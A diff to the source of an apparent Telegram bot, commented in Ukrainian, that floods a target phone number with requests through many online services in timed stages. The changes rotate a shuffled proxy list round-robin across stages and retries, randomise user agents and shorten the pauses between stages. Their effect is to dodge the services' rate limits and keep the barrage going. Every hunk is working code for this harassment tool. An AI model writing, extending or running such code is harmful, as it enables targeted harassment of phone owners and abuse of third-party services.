@@ -1270,32 +1270,53 @@ async def send_request(url, data=None, json=None, headers=None, method='POST', c
         else:
             raise ValueError(f"Unsupported method {method}")
 
-async def ukr(number, chat_id):
+async def ukr(number, chat_id, proxy_counter=None, shuffled_proxies_list=None):
     headers = {"User-Agent": fake_useragent.UserAgent().random}
-    
-    # Проксі: отримуємо доступні і налаштовуємо weighted rotation
-    proxies = []
-    if USE_PROXIES:
-        try:
-            proxies = await get_available_proxies(min_success_rate=0, use_cache=True)
-            logging.debug(f"[ATTACK] Proxies for attack: {len(proxies)} available")
-        except Exception as e:
-            logging.error(f"[ATTACK] Помилка отримання проксі: {e}")
-            proxies = []
     
     # Перевикористовуємо HTTP session
     session = await get_http_session()
     
-    # Лічильник для унікальних проксі на кожен запит
-    _proxy_counter = {'value': 0}
+    # Лічильник для round-robin розподілу проксі (якщо не передано, створюємо новий)
+    if proxy_counter is None:
+        _proxy_counter = {'value': 0}
+    else:
+        _proxy_counter = proxy_counter
+    
+    # Використовуємо переданий список перемішаних проксі або створюємо новий
+    import random
+    if shuffled_proxies_list is not None and len(shuffled_proxies_list) > 0:
+        # Використовуємо існуючий перемішаний список (для продовження між етапами)
+        shuffled_proxies = shuffled_proxies_list
+        logging.debug(f"[ATTACK] Використовуємо {len(shuffled_proxies)} проксі з попереднього етапу (поточний індекс: {_proxy_counter['value']})")
+    else:
+        # Отримуємо нові проксі та перемішуємо (тільки для першого етапу)
+        proxies = []
+        if USE_PROXIES:
+            try:
+                proxies = await get_available_proxies(min_success_rate=0, use_cache=True)
+                logging.debug(f"[ATTACK] Proxies for attack: {len(proxies)} available")
+            except Exception as e:
+                logging.error(f"[ATTACK] Помилка отримання проксі: {e}")
+                proxies = []
+        
+        shuffled_proxies = proxies.copy()
+        random.shuffle(shuffled_proxies)
+        logging.debug(f"[ATTACK] Створено новий перемішаний список з {len(shuffled_proxies)} проксі")
     
     def pick_proxy():
-        """Повертає унікальний проксі для кожного нового запиту"""
-        if not proxies or not USE_PROXIES:
+        """Повертає проксі через round-robin для рівномірного розподілу"""
+        if not shuffled_proxies or not USE_PROXIES:
             return None, None
         try:
+            # Round-robin: використовуємо modulo для циклічного обходу
+            idx = _proxy_counter['value'] % len(shuffled_proxies)
             _proxy_counter['value'] += 1
-            return pick_weighted_proxy(proxies, _proxy_counter['value'])
+            selected = shuffled_proxies[idx]
+            
+            normalized = normalize_proxy_string(selected)
+            url, auth = parse_proxy_for_aiohttp(normalized)
+            logging.debug(f"[PROXY] Pick proxy[{idx}/{len(shuffled_proxies)}] => {mask_proxy_for_log(normalized)}")
+            return url, auth
         except Exception as e:
             logging.error(f"[ATTACK] Помилка парсингу проксі: {e}")
             return None, None
@@ -1337,13 +1358,21 @@ async def ukr(number, chat_id):
                     return
                 
                 # При retry пробуємо новий проксі (якщо є)
-                if attempt > 0 and proxies and USE_PROXIES:
-                    new_proxy, new_auth = pick_weighted_proxy(proxies, attempt)
-                    if new_proxy:
-                        kwargs['proxy'] = new_proxy
-                        kwargs['proxy_auth'] = new_auth
-                        logging.debug(f"[ATTACK] Retry {attempt} for {url} with new proxy")
-                    else:
+                if attempt > 0 and shuffled_proxies and USE_PROXIES:
+                    try:
+                        # Беремо наступний проксі для retry
+                        retry_idx = (_proxy_counter['value'] + attempt - 1) % len(shuffled_proxies)
+                        retry_proxy = shuffled_proxies[retry_idx]
+                        normalized = normalize_proxy_string(retry_proxy)
+                        new_proxy, new_auth = parse_proxy_for_aiohttp(normalized)
+                        if new_proxy:
+                            kwargs['proxy'] = new_proxy
+                            kwargs['proxy_auth'] = new_auth
+                            logging.debug(f"[ATTACK] Retry {attempt} for {url} with new proxy")
+                        else:
+                            kwargs['proxy'] = original_proxy
+                            kwargs['proxy_auth'] = original_auth
+                    except Exception:
                         kwargs['proxy'] = original_proxy
                         kwargs['proxy_auth'] = original_auth
                 
@@ -1499,9 +1528,24 @@ async def start_attack(number, chat_id, status_message_id: int = None):
     
     timeout = 120  # 2 хвилини
     start_time = asyncio.get_event_loop().time()
-    MAX_ROUNDS = 3  # Максимум 3 раунди
-    PAUSE_MIN = 30  # Мінімальна пауза між раундами (секунди)
-    PAUSE_MAX = 40  # Максимальна пауза між раундами (секунди)
+    MAX_STAGES = 3  # Максимум 3 етапи
+    PAUSE_MIN = 10  # Мінімальна пауза між етапами (секунди)
+    PAUSE_MAX = 20  # Максимальна пауза між етапами (секунди)
+    
+    # Отримуємо список проксі один раз для всіх етапів
+    global_proxy_counter = {'value': 0}
+    global_shuffled_proxies = []
+    
+    if USE_PROXIES:
+        try:
+            proxies = await get_available_proxies(min_success_rate=0, use_cache=False)
+            import random
+            global_shuffled_proxies = proxies.copy()
+            random.shuffle(global_shuffled_proxies)
+            logging.info(f"[ATTACK] Ініціалізовано {len(global_shuffled_proxies)} проксі для всіх {MAX_STAGES} етапів")
+        except Exception as e:
+            logging.error(f"[ATTACK] Помилка отримання проксі: {e}")
+            global_shuffled_proxies = []
 
     async def update_status(text: str):
         """Оновлює статус повідомлення замість створення нового"""
@@ -1528,33 +1572,35 @@ async def start_attack(number, chat_id, status_message_id: int = None):
         except Exception as e:
             logging.error(f"Помилка перевірки проксі (продовжуємо без неї): {e}")
         
-        round_num = 0
-        while (asyncio.get_event_loop().time() - start_time) < timeout and round_num < MAX_ROUNDS:
+        stage_num = 0
+        while (asyncio.get_event_loop().time() - start_time) < timeout and stage_num < MAX_STAGES:
             if not attack_flags.get(chat_id):
                 logging.info(f"Атаку на номер {number} зупинено користувачем.")
                 await update_status(f'🛑 Атака на номер <i>{number}</i> зупинена користувачем.')
                 return
             
-            round_num += 1
-            logging.info(f"[ATTACK] Раунд {round_num}/{MAX_ROUNDS} для {number}")
-            await update_status(f'🎯 Місія в процесі\n\n📱 Ціль: <i>{number}</i>\n\n⚡ Раунд: {round_num}/{MAX_ROUNDS}')
+            stage_num += 1
+            logging.info(f"[ATTACK] Етап {stage_num}/{MAX_STAGES} для {number}")
+            await update_status(f'🎯 Місія в процесі\n\n📱 Ціль: <i>{number}</i>\n\n⚡ Етап: {stage_num}/{MAX_STAGES}')
             
             try:
-                # Виконуємо один раунд атаки (прохід по всіх сервісах)
-                await ukr(number, chat_id)
+                # Виконуємо один етап атаки (прохід по всіх сервісах)
+                # Передаємо лічильник та список проксі для продовження round-robin між етапами
+                await ukr(number, chat_id, global_proxy_counter, global_shuffled_proxies)
+                logging.info(f"[ATTACK] Етап {stage_num} завершено. Використано проксі до індексу {global_proxy_counter['value']}")
             except Exception as e:
-                logging.error(f"Помилка в раунді атаки (продовжуємо): {e}")
+                logging.error(f"Помилка в етапі атаки (продовжуємо): {e}")
             
             if not attack_flags.get(chat_id):
                 logging.info(f"Атаку на номер {number} зупинено користувачем.")
                 await update_status(f'🛑 Атака на номер <i>{number}</i> зупинена користувачем.')
                 return
             
-            # Пауза між раундами (якщо не останній раунд і не вичерпано час)
-            if round_num < MAX_ROUNDS and (asyncio.get_event_loop().time() - start_time) < (timeout - 10):
+            # Пауза між етапами (якщо не останній етап і не вичерпано час)
+            if stage_num < MAX_STAGES and (asyncio.get_event_loop().time() - start_time) < (timeout - 10):
                 pause_time = random.randint(PAUSE_MIN, PAUSE_MAX)
-                logging.info(f"[ATTACK] Пауза {pause_time} сек перед наступним раундом...")
-                await update_status(f'🎯 Місія в процесі\n\n📱 Ціль: <i>{number}</i>\n\n⚡ Раунд: {round_num}/{MAX_ROUNDS}\n⏸ Пауза {pause_time} сек...')
+                logging.info(f"[ATTACK] Пауза {pause_time} сек перед наступним етапом...")
+                await update_status(f'🎯 Місія в процесі\n\n📱 Ціль: <i>{number}</i>\n\n⚡ Етап: {stage_num}/{MAX_STAGES}\n⏸ Пауза {pause_time} сек...')
                 
                 # Перевіряємо під час паузи чи не зупинили атаку
                 elapsed = 0
